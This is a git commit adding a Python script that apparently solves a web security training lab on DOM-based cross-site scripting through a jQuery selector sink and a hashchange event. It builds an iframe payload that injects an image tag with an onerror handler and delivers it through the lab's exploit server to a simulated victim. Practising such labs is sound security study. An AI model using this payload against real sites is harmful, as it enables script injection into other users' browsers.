b8e35216810d8ea274e57baf7f09255f9f402c89
Mohammed Hawary <01022823818l@gmail.com>
2023-09-17 15:34:19 +0300

    17/09/2023

---
+++ XSS/DOM_XSS_in_jQuery_selector_sink_using_a_hashchange_event.py
@@ -0,0 +1,47 @@
+import requests
+import urllib3
+from sys import argv
+import os
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def get_website_urls():
+    if len(argv) != 3:
+        print(f"[+] usage {argv[0]} <url> <exploit server url> ")
+        print(f"[+] example {argv[0]} 'http://example.com' 'http://exploit.server.com'")
+        exit(-1)
+    if argv[1][-1] == '/':
+        url = argv[1][:-1]
+    else:
+        url = argv[1]
+
+    if argv[2][-1] == '/':
+        exlpoit_server = argv[2][:-1]
+    else:
+        exlpoit_server = argv[2]
+
+    return url, exlpoit_server
+
+def attack():
+    print("[+] Starting attack")
+    url, exlpoit_server = get_website_urls()
+    xss_payload = f"<iframe src=\"{url}/#\" onload=\"this.src+='<img src=1 onerror=print()>';\">"
+    params = {
+        "urlIsHttps":"on",
+        "responseFile":"/exploit",
+        "responseHead":"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
+        "responseBody":xss_payload,
+        "formAction":"DELIVER_TO_VICTIM"
+    }
+    
+    print(f"[+] sending xss payload : {xss_payload}")
+
+    r = requests.post(exlpoit_server, data=params)
+    r = requests.get(url)
+
+    if 'Congratulations' in r.text:
+        print("[+] attack successfully")
+    else:
+        print("[-] Attack un successfully")
+
+attack()
